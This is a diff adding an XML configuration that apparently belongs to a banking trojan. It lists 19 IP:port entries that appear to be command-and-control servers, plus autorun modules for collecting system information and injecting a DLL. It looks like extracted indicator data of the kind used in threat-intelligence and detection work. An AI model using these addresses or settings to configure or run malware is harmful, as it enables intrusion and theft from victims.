@@ -1,0 +1,29 @@
+<mcconf>
+    <ver>1000020</ver>
+    <gtag>mac1</gtag>
+    <servs>
+        <srv>194.87.234.99:443</srv>
+        <srv>195.2.252.152:443</srv>
+        <srv>37.59.158.241:443</srv>
+        <srv>5.45.64.113:443</srv>
+        <srv>194.87.102.6:443</srv>
+        <srv>185.86.150.185:443</srv>
+        <srv>147.135.144.28:443</srv>
+        <srv>195.133.144.138:443</srv>
+        <srv>212.24.110.190:443</srv>
+        <srv>212.24.110.154:443</srv>
+        <srv>89.231.13.24:443</srv>
+        <srv>76.8.104.213:443</srv>
+        <srv>193.0.140.177:443</srv>
+        <srv>68.191.80.115:443</srv>
+        <srv>89.231.13.18:443</srv>
+        <srv>89.231.13.27:443</srv>
+        <srv>89.231.13.33:443</srv>
+        <srv>196.11.84.62:443</srv>
+        <srv>176.121.213.31:445</srv>
+    </servs>
+    <autorun>
+        <module name="systeminfo" ctl="GetSystemInfo" />
+        <module name="injectDll" />
+    </autorun>
+</mcconf>
